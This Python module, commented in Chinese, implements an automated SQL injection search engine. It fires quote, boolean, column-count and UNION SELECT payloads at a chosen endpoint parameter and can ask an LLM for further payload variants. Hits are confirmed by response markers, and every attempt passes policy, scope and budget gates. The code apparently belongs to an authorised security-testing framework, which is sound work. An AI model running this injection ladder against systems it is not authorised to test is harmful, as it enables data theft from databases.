"""信号驱动的 POC 搜索器（T12 / ① 自主找 bug 的引擎侧）。

与既有的区别（这就是安全专家问的"POC 从哪来"）：
  * 既有：只发 `plugins/<class>/payloads/attack/` 里的载荷（人工资产）；
  * 本模块：**给端点与参数名，自己按阶梯把 payload 试出来** ——
    引号 → 注释 → 布尔对 → 列宽差分 → 自省 → 取数，每步由**硬信号**决定是否继续/转向。

硬信号（唯一判定依据）：状态码、响应长度差分、marker 命中。
模型（LLM）只能在阶梯走完后兜底出招，产物同样过策略闸门、同样入候选队列。

纪律：
  1. 每次发射前过 `governance.payload_policy.assert_allowed`；
  2. 每次尝试都落证据（请求/响应摘要 + 判定），并入 `poc_queue`（未命中留 untried）；
  3. 只有 **marker 命中** 才算 `exploited_confirmed`（模型自述不算）；
  4. 预算硬上限（请求数 / 秒数），耗尽如实报 `budget_exhausted`；
  5. 本模块**不写** `plugins/`（写回由操作员跑 `tools/poc_apply.py`）。
"""
from __future__ import annotations

import json
import os
import pathlib
import re
import sys
import time
from typing import Dict, List, Optional, Tuple

ROOT = pathlib.Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import requests  # noqa: E402

from engine import replay  # noqa: E402
from engine.poc_queue import PocQueue, PocQueueError  # noqa: E402
from engine.target_profile import active as active_profile, TargetProfileError  # noqa: E402

LADDERS = ROOT / "engine" / "ladders"


class HuntError(RuntimeError):
    pass


def _scrub_for_evidence(text: str) -> str:
    from engine.learning_queue import scrub_v2
    return scrub_v2(text or "")


def exchange_evidence(method, url, request_body, status, response, error=""):
    """One scrub/truncate protocol for the judge and the training queue."""
    from urllib.parse import urlsplit
    u = urlsplit(url)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    return {"schema_version": 1, "method": method.upper(),
            "path": _scrub_for_evidence(path),
            "body": _scrub_for_evidence(request_body)[:1000],
            "status": status, "response": _scrub_for_evidence(response)[:4000],
            "error": _scrub_for_evidence(error)[:200]}


def load_ladder(cls: str) -> dict:
    import yaml
    p = LADDERS / f"{cls}.yaml"
    if not p.is_file():
        raise HuntError(f"没有 {cls} 的阶梯（{p}）；已支持: {available_ladders()}")
    return yaml.safe_load(p.read_text(encoding="utf-8"))


def available_ladders() -> List[str]:
    if not LADDERS.is_dir():
        return []
    return sorted(p.stem for p in LADDERS.glob("*.yaml"))


class Hunt:
    """一次搜索 = 一个 (target, path, param, class) 的阶梯执行。"""

    def __init__(self, base: str, path: str, param: str, cls: str = "sqli",
                 profile=None, budget_requests: int = 40, budget_seconds: float = 120.0,
                 queue: Optional[PocQueue] = None, instance: str = "a", scope=None,
                 use_library: bool = False, llm_fallback: bool = False, llm_shots: int = 4):
        self.base = base.rstrip("/")
        self.path = path if path.startswith("/") else "/" + path
        self.param = param
        self.cls = cls
        self.profile = profile or active_profile()
        self.budget_requests = int(budget_requests)
        self.budget_seconds = float(budget_seconds)
        # LLM 兜底：阶梯走完未命中时叫模型出菜单外的新形态（默认关）。
        # 要点：模型只是"出招提议者"；每发仍走 _fire 的 policy/scope 双闸，
        # 命中与否仍由 marker（硬信号）判定 —— 模型说了不算。
        self.llm_fallback = bool(llm_fallback)
        self.llm_shots = int(llm_shots)
        self.queue = queue or PocQueue()
        self.instance = instance
        self.scope = scope
        self.use_library = bool(use_library)
        self.library_hit: Optional[str] = None
        self.started = time.time()
        self.requests_used = 0
        self.attempts: List[dict] = []
        self.session = requests.Session()
        self.cookie = ""
        self.detector_markers: List[str] = []
        self._load_markers()
        self._login()

    # ---------- 准备 ----------
    def _plugin_dir(self) -> pathlib.Path:
        return self.profile.plugin_dir(self.cls, ROOT / "plugins")

    def _load_markers(self) -> None:
        import yaml
        p = self._plugin_dir() / "plugin.yaml"
        if not p.is_file():
            raise HuntError(f"{self.cls} 类缺 plugin.yaml（{p}）⇒ 无 marker 判据，拒绝盲跑")
        meta = yaml.safe_load(p.read_text(encoding="utf-8"))
        det = meta.get("detector") or {}
        self.detector_markers = list(meta.get("markers") or det.get("markers") or [])
        if not self.detector_markers:
            raise HuntError("plugin.yaml 未声明 markers ⇒ 无法判定命中，拒绝盲跑")

    def _login(self) -> None:
        try:
            self.cookie = replay.admin_session(self.base, self.instance)
        except Exception as exc:  # noqa: BLE001
            if replay._auth_mode() != "none":
                raise HuntError(f"会话获取失败: {type(exc).__name__}: {exc}") from exc

    # ---------- 发射 ----------
    def _budget_left(self) -> Tuple[bool, str]:
        if self.requests_used >= self.budget_requests:
            return False, "requests_exhausted"
        if time.time() - self.started > self.budget_seconds:
            return False, "seconds_exhausted"
        return True, ""

    def _fire(self, value: str, step_id: str = "", extra: str = "") -> dict:
        """发一发（值按 URL 参数编码）并返回观测；每发都进证据与候选队列。"""
        ok, why = self._budget_left()
        if not ok:
            raise HuntError(f"budget:{why}")
        url = f"{self.base}{self.path}"
        headers = {"Cookie": self.cookie} if self.cookie else {}
        # 策略闸门：与主链同一道门，不因是本模块而豁免。
        # 约定（与 engine/replay.check_payload_policy 一致）：送闸门的是**载荷模板**
        # ——目标地址写作 {{TARGET}} 占位符；真实地址是否被授权由 scope 闸门管。
        raw_tpl = (f"GET {{{{TARGET}}}}{self.path}?{self.param}={value} HTTP/1.1\n"
                   + ("Cookie: {{SESSION}}\n" if self.cookie else "") + "\n")
        from governance.payload_policy import assert_allowed
        assert_allowed(raw_tpl)
        # scope 闸门（若操作员给了 scope 文件）：真实地址必须在授权清单里
        if self.scope is not None:
            self.scope.check_url(url)
            self.scope.check_class(self.cls)
        t0 = time.time()
        try:
            from urllib.parse import quote
            r = self.session.get(f"{url}?{self.param}={quote(value, safe='')}",
                                 headers=headers, timeout=10, allow_redirects=False)
            status, body = r.status_code, r.text
        except Exception as exc:  # noqa: BLE001 —— 网络失败必须可见
            status, body = 0, f"<error {type(exc).__name__}: {str(exc)[:120]}>"
        self.requests_used += 1
        hits = [m for m in self.detector_markers if m in body]
        self._last_body = body
        obs = {
            "n": self.requests_used,
            "step": step_id,
            "value": _scrub_for_evidence(value)[:200],
            "status": status,
            "length": len(body),
            "markers_hit": hits,
            "elapsed_ms": int((time.time() - t0) * 1000),
            "url": getattr(locals().get("r"), "url", ""),
            "note": extra,
            "exchange": exchange_evidence("GET", getattr(locals().get("r"), "url", url),
                                          "", status, body, "network_error" if status == 0 else ""),
        }
        # 入候选队列（含失败）：未命中留 untried，命中即取证
        try:
            cid = self._queue(obs, value)
            obs["poc_candidate_id"] = cid
            if hits:
                self.queue.confirm(cid, {"status": status, "method": "GET",
                                         "path": f"{self.path}?{self.param}=…",
                                         "response": body[:600]},
                                   hits, origin_run="", origin_flow="")
                obs["confirmed"] = True
        except PocQueueError as exc:  # 队列问题不得掩盖判定，但要可见
            obs["queue_error"] = str(exc)[:200]
        self.attempts.append(obs)
        return obs

    def _fire_request(self, req_tpl: str, step_id: str = "") -> dict:
        """发一发**原始请求文本**（POST/表单/multipart 等 `_fire` 覆盖不到的形状）。

        与 `_fire` 同一套规矩：过 payload policy 闸与 scope 闸、留证据、进候选队列、
        命中只看 marker；`{{...}}` 占位符（含实例 surface 名与会话）由 replay 用当前
        profile 的 ctx 展开。模板里出现的不在授权面内的地址，交给 scope 闸判死。
        """
        ok, why = self._budget_left()
        if not ok:
            raise HuntError(f"budget:{why}")
        from governance.payload_policy import assert_allowed
        assert_allowed(req_tpl)                    # 与主链同一道门（模板文本，含 {{TARGET}}）
        line0 = req_tpl.strip().splitlines()[0] if req_tpl.strip() else ""
        if self.scope is not None:
            try:
                target = line0.split()[1].replace("{{TARGET}}", self.base)
            except IndexError:
                target = self.base
            self.scope.check_url(target)
            self.scope.check_class(self.cls)
        from engine import replay
        if getattr(self, "_ctx", None) is None:
            self._ctx = replay.make_ctx(self.base, getattr(self, "instance", "a"), self.cookie)
        t0 = time.time()
        res = replay.replay_payload(self.base, req_tpl, step_id or "request", self._ctx,
                                    self.detector_markers)
        self.requests_used += 1
        body = res.response_text or ""
        self._last_body = body
        hits = list(res.markers_hit or [])
        obs = {"step": step_id, "kind": "request",
               "url": line0.replace("{{TARGET}}", self.base)[:120],
               "status": res.status, "length": len(body), "markers_hit": hits,
               "elapsed_ms": int((time.time() - t0) * 1000)}
        expanded = replay.substitute(req_tpl, self._ctx)
        method, raw_path, _headers, request_body = replay.parse_req(expanded)
        obs["exchange"] = exchange_evidence(method, raw_path, request_body, res.status,
                                            body, "network_error" if not res.status else "")
        try:
            cid = self._queue_raw(obs, req_tpl)
            obs["poc_candidate_id"] = cid
            if hits:
                self.queue.confirm(cid, {"status": res.status, "method": line0.split()[0],
                                         "path": line0.split()[1][:120],
                                         "response": body[:600]},
                                   hits, origin_run="", origin_flow="")
                obs["confirmed"] = True
        except PocQueueError as exc:  # 队列问题不得掩盖判定，但要可见
            obs["queue_error"] = str(exc)[:200]
        self.attempts.append(obs)
        return obs

    def _queue_raw(self, obs: dict, req_text: str) -> str:
        """把原始请求文本原样入队（_queue 只能从"值"重建 GET 查询串，不够用）。"""
        res = self.queue.append({
            "class": self.cls, "source": "menu", "parent": "ladder",
            "transform_id": obs.get("step"), "intent": "attack",
            "request_text": req_text, "base": self.base,
            "rationale": f"hunt raw-request step={obs.get('step')}",
        })
        return (res.get("candidate") or res.get("existing") or {}).get("candidate_id") or ""

    def _queue(self, obs: dict, value: str) -> str:
        from urllib.parse import quote
        enc = quote(value, safe="")           # 空格→%20，逗号→%2C（目标按字面解析查询串）
        raw = (f"GET {self.base}{self.path}?{self.param}={enc} HTTP/1.1\n"
               + ("Cookie: {{SESSION}}\n" if self.cookie else "") + "\n")
        res = self.queue.append({
            "class": self.cls, "source": "menu", "parent": "ladder",
            "transform_id": obs.get("step"), "intent": "attack",
            "request_text": raw, "base": self.base,
            "rationale": f"hunt ladder step={obs.get('step')}",
        })
        return (res.get("candidate") or res.get("existing") or {}).get("candidate_id") or ""

    # ---------- 阶梯 ----------
    def _library_round(self) -> Optional[dict]:
        """先打 POC 库（plugin overlay 里的 attack 载荷）：命中即返回该发观测。

        这是"上轮沉淀、本轮用上"的执行点：库里的载荷经 {{TARGET}}/{{SESSION}} 替换后
        按文件名顺序发射，任何一发 marker 命中就停手（不浪费预算）。
        """
        from urllib.parse import quote
        d = self._plugin_dir() / "payloads" / "attack"
        if not d.is_dir():
            return None
        files = sorted(d.glob("*.txt"))
        for pf in files:
            ok, _ = self._budget_left()
            if not ok:
                break
            raw = pf.read_text(encoding="utf-8")
            first = raw.split("\n", 1)[0].strip()
            m = re.match(r"^([A-Z]+)\s+(\S+)\s+HTTP/1\.[01]$", first)
            if not m:
                continue
            method, target = m.group(1), m.group(2)
            path_q = target.replace("{{TARGET}}", "").replace("{{SESSION}}", "")
            if path_q.startswith("http"):
                path_q = "/" + path_q.split("/", 3)[3] if path_q.count("/") >= 3 else "/"
            # 只处理 GET 且带参数的目标（POST 类载荷留给后续扩展，避免假装支持）
            if method != "GET" or "?" not in path_q:
                continue
            path, _, query = path_q.partition("?")
            url = f"{self.base}{path}?{query}"
            from governance.payload_policy import assert_allowed
            assert_allowed(raw)                       # 库内载荷同样过闸门
            if self.scope is not None:
                self.scope.check_url(f"{self.base}{path}")
                self.scope.check_class(self.cls)
            r = None
            try:
                r = self.session.get(url, headers={"Cookie": self.cookie} if self.cookie else {},
                                     timeout=10, allow_redirects=False)
                status, body = r.status_code, r.text
            except Exception as exc:  # noqa: BLE001
                status, body = 0, f"<error {type(exc).__name__}>"
            self.requests_used += 1
            hits = [mm for mm in self.detector_markers if mm in body]
            obs = {"n": self.requests_used, "step": f"library:{pf.name}", "value": "",
                   "status": status, "length": len(body), "markers_hit": hits,
                   "url": getattr(r, "url", ""), "note": "库内载荷",
                   "exchange": exchange_evidence("GET", url, "", status, body,
                                                 "network_error" if status == 0 else "")}
            self.attempts.append(obs)
            if hits:
                self.library_hit = pf.name
                try:
                    cid = self._queue(obs, query.split("=", 1)[-1] if "=" in query else "")
                    obs["poc_candidate_id"] = cid
                    self.queue.confirm(cid, {"status": status, "method": "GET",
                                             "path": f"{path}?{query}", "response": body[:600]},
                                       hits, origin_run="", origin_flow="")
                    obs["confirmed"] = True
                except Exception as exc:  # noqa: BLE001
                    obs["queue_error"] = str(exc)[:200]
                return obs
        return None

    def run(self) -> dict:
        ladder = load_ladder(self.cls)
        base_val = str((ladder.get("baseline") or {}).get("param_value", "1"))
        if self.use_library:
            lib_obs = self._library_round()
            if lib_obs is not None and lib_obs.get("markers_hit"):
                out = self._verdict("exploited_confirmed", hit=lib_obs,
                                    notes=[f"library_first_hit={self.library_hit}",
                                           "本轮命中来自 POC 库（上轮沉淀后被用上）"])
                out["library_hit"] = self.library_hit
                return out
        base = self._fire(base_val, "baseline")
        if base["status"] == 0:
            return self._verdict("not_found", hit=None, reason="target_unreachable")
        anomaly_steps: List[dict] = []
        hit: Optional[dict] = None
        col_count: Optional[int] = None
        notes: List[str] = []
        ctx_facts: dict = {}

        for step in ladder.get("steps", []):
            ok, why = self._budget_left()
            if not ok:
                notes.append(f"budget_stop:{why}@step={step.get('id')}")
                break
            sid, kind = step.get("id"), step.get("kind")
            try:
                if kind == "single":
                    obs = self._fire(str(step["value"]).format(v=base_val), sid)
                    if obs["status"] != base["status"] or abs(obs["length"] - base["length"]) > 32:
                        anomaly_steps.append(obs)
                elif kind == "pair":
                    t = self._fire(str(step["true_value"]).format(v=base_val), sid + ":true")
                    f = self._fire(str(step["false_value"]).format(v=base_val), sid + ":false")
                    if (t["status"] != f["status"]
                            or abs(t["length"] - f["length"]) > 16):
                        anomaly_steps.append({"step": sid, "note": "boolean differential",
                                              "true": {"status": t["status"], "length": t["length"]},
                                              "false": {"status": f["status"], "length": f["length"]}})
                    if t["markers_hit"]:
                        hit = t
                elif kind == "request":
                    obs = self._fire_request(str(step["value"]), sid)   # request 模板含 { } 与 {{...}} 占位符 ⇒ 绝不能过 .format
                    if obs["status"] != base["status"] or abs(obs["length"] - base["length"]) > 32:
                        anomaly_steps.append(obs)
                    if obs["markers_hit"]:
                        hit = obs
                elif kind == "sweep":
                    # 正确信号：**列宽匹配的那一发会 2xx**（其余因列数不符报错）。
                    # 早期版本把"状态码与基线不同"当候选 ⇒ 把所有报错的 n 都当候选，
                    # 取到 n=1 这种明显错的列宽（实测踩过，见 T12 施工记录）。
                    ok_ns: List[int] = []
                    for n in range(int(step.get("from", 1)), int(step.get("to", 12)) + 1):
                        ok2, _ = self._budget_left()
                        if not ok2:
                            break
                        nulls = ", ".join(["NULL"] * n)
                        obs = self._fire(str(step["template"]).format(v=base_val, nulls=nulls),
                                         f"{sid}:n={n}")
                        if obs["markers_hit"]:
                            hit = obs
                            col_count = n
                            break
                        st = obs.get("status")
                        if isinstance(st, int) and 200 <= st < 300:
                            ok_ns.append(n)
                    if hit is None and ok_ns:
                        col_count = ok_ns[0] if len(ok_ns) == 1 else min(ok_ns)
                        notes.append(f"column_count_ok={ok_ns}")
                        if len(ok_ns) > 1:
                            notes.append("column_count_ambiguous: 多个 n 都 2xx，取最小并标注")
                    elif hit is None:
                        notes.append("column_count: 无 2xx 响应（未定出列宽）")
                elif kind == "rotation":
                    if col_count is None:
                        notes.append(f"skip:{sid}(未知列宽)")
                        continue
                    need = list(step.get("requires") or [])
                    if any(n not in ctx_facts for n in need):
                        notes.append(f"skip:{sid}(缺前置 {need})")
                        continue
                    exprs = [e.strip() for e in str(step.get("expression", "")).split(",")]
                    filler = "1"
                    for rot in range(col_count):
                        ok3, _ = self._budget_left()
                        if not ok3:
                            break
                        cols = exprs[rot:] + [filler] * max(0, col_count - len(exprs[rot:]))
                        # 若表达式比列宽还长，截断
                        cols = cols[:col_count]
                        sel = ", ".join(cols)
                        where = step.get("where") or ""
                        if where:
                            where = where.format(table=ctx_facts.get("introspect_table_name", ""))
                        val = (f"{base_val}' UNION SELECT {sel} FROM {step.get('from_table')}"
                               + (f" WHERE {where}" if where else "")
                               + "-- ")
                        obs = self._fire(val, f"{sid}:rot={rot}")
                        if obs["markers_hit"]:
                            hit = obs
                            m = re.search(r"CREATE TABLE\s+([A-Za-z_][A-Za-z0-9_]*)",
                                          getattr(self, "_last_body", ""))
                            if m:
                                ctx_facts["introspect_table_name"] = m.group(1)
                                notes.append(f"introspect_table={m.group(1)}")
                            break
            except HuntError as exc:
                if str(exc).startswith("budget:"):
                    notes.append(f"budget_stop:{str(exc)[7:]}@step={sid}")
                    break
                raise

        if hit is None and self.llm_fallback:
            hit = self._llm_round(notes)

        if hit:
            claim = "exploited_confirmed"
        elif any(a.get("step") for a in anomaly_steps):
            claim = "anomaly_only"
        else:
            claim = "not_found"
        if claim != "exploited_confirmed" and self.requests_used >= self.budget_requests:
            claim = "budget_exhausted"
        return self._verdict(claim, hit=hit, anomalies=anomaly_steps, notes=notes,
                             col_count=col_count)

    def _llm_round(self, notes: List[str]) -> Optional[dict]:
        """阶梯走完未命中 ⇒ 叫模型出菜单外新形态（兜底），仍走同一条发射路径。

        纪律（与 hunt 其余部分一致，fail-closed）：
          * 模型只负责"出招提议"；命中与否只看 marker 硬信号，模型说了不算；
          * 每一发都过 `_fire` 里的 policy 闸与 scope 闸，被拒的照实入账；
          * 只接受落在**本端点本参数**上的载荷值；形态外的请求**不发射**并记 skip；
          * 模型不可用 / 出招被拒 / 预算耗尽，全部如实写进 notes，绝不假装成功。
        """
        from engine import attacker as _atk
        try:
            plan = _atk.plan_free(
                self.cls, [],
                f"确定性阶梯跑完未命中；端点 {self.path} 参数 {self.param}，请给菜单外的新形态",
                n=int(self.llm_shots))
        except Exception as exc:  # noqa: BLE001 —— 模型不可用是合法结果
            notes.append(f"llm_fallback_unavailable:{type(exc).__name__}:{str(exc)[:140]}")
            return None
        accepted = plan.get("accepted") or []
        rejected = plan.get("rejected") or []
        notes.append(f"llm_fallback:accepted={len(accepted)} rejected={len(rejected)}"
                     + (f" jail={plan.get('jail')}" if plan.get("jail") else ""))
        for i, item in enumerate(rejected[:6]):
            notes.append(f"llm_rejected[{i}]:{str(item.get('why_rejected'))[:140]}")
        for i, item in enumerate(accepted):
            value = self._value_from_request(str(item.get("text") or ""))
            if value is None:
                notes.append(f"llm_skipped[{i}]:off_endpoint")
                continue
            try:
                obs = self._fire(value, f"llm:{i}")
            except HuntError as exc:
                notes.append(f"llm_stop:{str(exc)[:90]}")
                break
            except Exception as exc:  # noqa: BLE001 —— policy/scope 拒绝也照实记
                notes.append(f"llm_refused[{i}]:{type(exc).__name__}:{str(exc)[:120]}")
                continue
            if obs.get("markers_hit"):
                notes.append(f"llm_fallback_hit@llm:{i}")
                return obs
        return None

    def _value_from_request(self, req: str) -> Optional[str]:
        """从模型给的请求里取回"本端点本参数"的值；不是本端点/本参数 ⇒ None。"""
        from urllib.parse import parse_qsl, urlsplit
        try:
            line = req.strip().splitlines()[0]
            _method, target, _ver = line.split()
        except Exception:  # noqa: BLE001 —— 形态不合规一律不发射
            return None
        target = target.replace("{{TARGET}}", self.base)
        try:
            sp = urlsplit(target)
        except Exception:  # noqa: BLE001
            return None
        if sp.path != self.path:
            return None
        for k, v in parse_qsl(sp.query, keep_blank_values=True):
            if k == self.param and v:
                return v
        return None

    def _verdict(self, claim: str, hit: Optional[dict], anomalies=None, notes=None,
                 col_count=None, reason: str = "") -> dict:
        out = {
            "status": "ok",
            "claim": claim,
            "target": self.profile.name,
            "class": self.cls,
            "path": self.path,
            "param": self.param,
            "markers": self.detector_markers,
            "baseline": self.attempts[0] if self.attempts else None,
            "anomalies": anomalies or [],
            "column_count": col_count,
            "hit": hit,
            "attempts": self.attempts,
            "budget": {"requests_used": self.requests_used,
                       "requests_cap": self.budget_requests,
                       "seconds_used": round(time.time() - self.started, 2),
                       "seconds_cap": self.budget_seconds},
            "notes": notes or [],
            "queue": self.queue.stats(),
        }
        if reason:
            out["reason"] = reason
        return out


def main(argv: Optional[List[str]] = None) -> int:
    import argparse
    ap = argparse.ArgumentParser(description="signal-driven POC search (T12/①)")
    ap.add_argument("--path", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--class", dest="cls", default="sqli")
    ap.add_argument("--base", default=None, help="默认取 profile 的 instance base")
    ap.add_argument("--instance", default="a")
    ap.add_argument("--budget-requests", type=int, default=40)
    ap.add_argument("--budget-seconds", type=float, default=120.0)
    ap.add_argument("--queue", default=None)
    ap.add_argument("--scope", default=None, help="操作员 scope JSON（授权目标清单）")
    ap.add_argument("--use-library", action="store_true",
                    help="先打 POC 库（含已审核写回的载荷），命中即停")
    ap.add_argument("--llm-fallback", action="store_true",
                    help="阶梯走完未命中时叫模型出菜单外新形态（仍走同一套闸门与硬信号判定）")
    ap.add_argument("--llm-shots", type=int, default=4, help="兜底最多几发（默认 4）")
    a = ap.parse_args(argv)

    from engine.poc_queue import DEFAULT_QUEUE
    try:
        prof = active_profile()
    except TargetProfileError as exc:
        print(json.dumps({"status": "error", "code": "target_profile_error",
                          "detail": str(exc)[:200]}, ensure_ascii=False))
        return 2
    base = a.base or prof.instance(a.instance).base
    q = PocQueue(pathlib.Path(a.queue) if a.queue else DEFAULT_QUEUE)
    scope = None
    if a.scope:
        import json as _json
        from engine.scope import Scope
        scope = Scope(**_json.loads(pathlib.Path(a.scope).read_text(encoding="utf-8")))
    try:
        hunt = Hunt(base=base, path=a.path, param=a.param, cls=a.cls, profile=prof,
                    budget_requests=a.budget_requests, budget_seconds=a.budget_seconds,
                    queue=q, instance=a.instance, scope=scope,
                    use_library=a.use_library, llm_fallback=a.llm_fallback,
                    llm_shots=a.llm_shots)
        print(json.dumps(hunt.run(), ensure_ascii=False))
        return 0
    except HuntError as exc:
        print(json.dumps({"status": "error", "code": "hunt_error",
                          "detail": str(exc)[:300]}, ensure_ascii=False))
        return 2


if __name__ == "__main__":
    sys.exit(main())
